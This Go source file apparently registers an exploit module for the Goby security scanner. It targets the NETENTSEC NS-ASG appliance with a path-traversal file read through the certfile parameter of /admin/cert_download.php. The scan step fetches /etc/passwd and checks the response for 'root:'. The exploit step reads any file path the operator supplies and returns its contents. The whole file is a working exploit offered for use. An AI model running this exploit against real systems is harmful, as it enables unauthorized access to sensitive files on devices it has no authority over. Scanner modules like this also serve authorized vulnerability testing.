package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "NETENTSEC-NS-ASG File Read",
    "Description": "File Read",
    "Product": "NETENTSEC-NS-ASG",
    "Homepage": "",
    "DisclosureDate": "2021-05-10",
    "Author": "Rose",
    "GobyQuery": "parent_category=\"Network Security\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "path",
            "type": "input",
            "value": "../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/cert_download.php?file=test.txt&certfile={{{path}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [
        "文件读取"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10198"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
